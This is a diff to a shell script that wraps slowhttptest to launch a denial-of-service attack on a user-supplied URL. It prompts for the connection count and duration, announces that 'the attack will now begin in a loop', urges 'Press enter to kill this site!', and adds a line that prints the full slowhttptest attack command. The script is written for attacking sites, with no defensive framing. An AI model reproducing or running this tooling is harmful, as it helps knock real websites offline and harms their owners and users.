@@ -27,7 +27,7 @@ clear
 
 echo Url = $url
 echo
-echo Set the number of connections to be made, Default is 3000:
+echo Set the number of connections to be made, Max is 65539:
 
 read con
 
@@ -50,9 +50,12 @@ echo Time = $time
 echo
 sleep 1
 
-echo The attack will now begin in a loop, if the site goes offline and then back online, press CONTROL C. If you get crazy lines of error codes, ya did somthing wrong in the setup
+echo The attack will now begin in a loop, if the site goes offline and then back online, press CONTROL C. If you get crazy lines of error codes, 
+echo ya did somthing wrong in the setup
 
 sleep 3
+echo
+echo This is the code BTW: slowhttptest -c $con -H -l $time -i 10 -r 200 -t GET -u $url -x 24 -p 3
 echo
 echo Press enter to kill this site!
 
